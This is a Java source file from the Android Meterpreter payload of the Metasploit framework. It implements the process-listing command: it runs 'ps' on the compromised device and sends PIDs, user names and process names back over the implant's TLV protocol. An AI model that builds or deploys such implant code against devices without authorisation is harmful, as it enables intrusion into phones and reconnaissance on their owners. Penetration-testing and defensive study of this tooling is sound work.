package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.BufferedReader;
import java.io.InputStreamReader;


public class stdapi_sys_process_get_processes_android implements Command {

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Process proc = Runtime.getRuntime().exec(new String[] {
                "sh", "-c", "ps 2>/dev/null"
        });
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String line = br.readLine();
        if (line == null) {
            return ERROR_FAILURE;
        }
        while ((line = br.readLine()) != null) {
            String[] parts = line.replace('\t', ' ').trim().split(" ");
            if (parts.length < 2) {
                continue;
            }
            int pid = -1;
            for (String part : parts) {
                try {
                    pid = Integer.valueOf(part);
                } catch (NumberFormatException e) {
                    continue;
                }
                break;
            }
            TLVPacket grp = new TLVPacket();
            grp.add(TLVType.TLV_TYPE_PID, pid);
            grp.add(TLVType.TLV_TYPE_USER_NAME, parts[0]);
            grp.add(TLVType.TLV_TYPE_PROCESS_NAME, parts[parts.length - 1]);
            response.addOverflow(TLVType.TLV_TYPE_PROCESS_GROUP, grp);
            
        }
		return ERROR_SUCCESS;
	}
}
